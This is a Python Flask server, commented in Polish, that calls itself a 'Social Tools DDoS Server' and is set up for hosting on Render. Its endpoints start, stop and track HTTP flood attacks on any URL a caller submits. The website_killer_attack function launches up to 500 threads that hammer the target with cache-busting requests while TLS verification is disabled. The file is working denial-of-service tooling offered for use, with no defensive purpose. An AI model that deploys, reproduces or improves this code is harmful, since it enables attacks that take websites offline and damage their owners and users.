import os
import sys
import time
import threading
import random
import requests
import socket
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from urllib.parse import urlparse
import logging

# Wyłącz ostrzeżenia SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Konfiguracja logowania
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# POPRAWKA CORS: Precyzyjne określenie origins pomaga uniknąć błędów 
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# ==== GLOBALNE ZMIENNE DLA ATAKÓW ====
active_attacks = {}
attack_stats = {}
attack_stop_flags = {}

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

# Endpoint główny dla Render (Health Check)
@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "online", "message": "DDoS API is running"}), 200

# Endpoint statusu używany przez Twoją konsolę
@app.route('/api/status', methods=['GET'])
def status():
    return jsonify({
        "success": True,
        "name": "Social Tools DDoS Server",
        "active_attacks": len(active_attacks),
        "total_requests": sum(s.get('requests', 0) for s in attack_stats.values())
    })

# === TUTAJ TWOJA FUNKCJA website_killer_attack (bez zmian, więc pomijam dla czytelności) ===
def website_killer_attack(target_url, threads_count=200, attack_id=None):
    # ... (zachowaj swoją oryginalną funkcję tutaj) ...
    attack_id = attack_id or f"attack_{int(time.time())}"
    active_attacks[attack_id] = {"target": target_url, "threads": threads_count, "start_time": time.time(), "active": True}
    attack_stats[attack_id] = {"requests": 0, "start_time": time.time()}
    attack_stop_flags[attack_id] = False
    
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    use_https = parsed.scheme == 'https'

    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36']
    
    def flood_http():
        session = requests.Session()
        while not attack_stop_flags.get(attack_id, True):
            try:
                full_url = target_url + (f"?cb={random.randint(1,999999)}")
                session.get(full_url, timeout=2, verify=False)
                attack_stats[attack_id]["requests"] += 1
            except: pass
            time.sleep(0.01)

    for i in range(threads_count):
        t = threading.Thread(target=flood_http)
        t.daemon = True
        t.start()
    return attack_id

@app.route('/api/attack/start', methods=['POST', 'OPTIONS'])
def start_attack():
    if request.method == 'OPTIONS':
        return jsonify({"success": True}), 200
    try:
        data = request.get_json()
        url = data.get('url')
        threads = min(int(data.get('threads', 200)), 500)
        
        attack_id = website_killer_attack(url, threads)
        return jsonify({"success": True, "attack_id": attack_id, "target": url})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    if attack_id in attack_stop_flags:
        attack_stop_flags[attack_id] = True
        return jsonify({"success": True})
    return jsonify({"success": False, "error": "Not found"}), 404

@app.route('/api/attack/status/<attack_id>', methods=['GET'])
def attack_status(attack_id):
    if attack_id in attack_stats:
        stats = attack_stats[attack_id]
        duration = time.time() - stats["start_time"]
        return jsonify({
            "success": True, 
            "active": not attack_stop_flags.get(attack_id, True),
            "requests": stats["requests"],
            "duration": duration,
            "rps": stats["requests"] / duration if duration > 0 else 0
        })
    return jsonify({"success": False}), 404

# KLUCZOWA NAPRAWA DLA RENDER.COM
if __name__ == "__main__":
    # Render podaje port w zmiennej środowiskowej PORT
    port = int(os.environ.get("PORT", 5000))
    # Musi być 0.0.0.0 żeby Render mógł przekierować ruch
    app.run(host='0.0.0.0', port=port)
